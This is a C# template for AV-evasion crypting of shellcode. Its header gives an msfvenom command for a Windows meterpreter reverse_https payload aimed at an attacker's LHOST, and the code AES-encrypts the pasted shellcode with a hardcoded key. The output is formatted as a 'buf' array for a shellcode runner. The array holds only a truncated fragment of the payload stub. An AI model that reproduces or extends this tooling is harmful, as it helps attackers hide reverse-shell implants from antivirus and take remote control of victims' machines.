// =============================================================================
// TEMPLATE — replace shellcode bytes with your msfvenom output before compiling
//
//   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
//   2. Paste the bytes into the shellcode array below and update the byte count
//   3. Compile and run — output is your encrypted buf, ready to paste into a runner
// =============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Bootstrap
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // Your provided shellcode (12 bytes; note: you declared it as 783, but only 12 values are listed—adjust if this is incomplete)
            byte[] shellcode = new byte[12] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
                0xcc, 0x00, 0x00, 0x00, 0x48, 0x0f
            };

            byte[] encrypted = Encrypt(shellcode);

            Console.WriteLine(ToMsfvenomCSharpFormat(encrypted));
        }

        static string ToMsfvenomCSharpFormat(byte[] bytes, string varName = "buf")
        {
            var sb = new StringBuilder();

            sb.AppendLine($"byte[] {varName} = new byte[{bytes.Length}] {{");
            sb.Append("    ");

            for (int i = 0; i < bytes.Length; i++)
            {
                sb.Append($"0x{bytes[i]:x2}");

                // Add comma except on the very last byte
                if (i < bytes.Length - 1)
                    sb.Append(",");

                // 12 bytes per line (exact Metasploit style)
                if ((i + 1) % 12 == 0 || i == bytes.Length - 1)
                    sb.AppendLine().Append("    ");
                else
                    sb.Append(" ");
            }

            sb.AppendLine("};");
            return sb.ToString();
        }

        static byte[] Encrypt(byte[] shellcode)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                aes.Key = Encryption.Key;
                aes.GenerateIV(); // Random IV each time (best practice)

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                using (var ms = new MemoryStream())
                {
                    // Prepend IV so we can decrypt later
                    ms.Write(aes.IV, 0, aes.IV.Length);

                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(shellcode, 0, shellcode.Length);
                        cs.FlushFinalBlock();
                    }

                    return ms.ToArray(); // IV (16) + encrypted shellcode
                }
            }
        }

        static class Encryption
        {
            public static readonly byte[] Key = Encoding.UTF8.GetBytes("t51JpSvoag6052x1go4PvuSiLOwNWifX");
        }
    }
}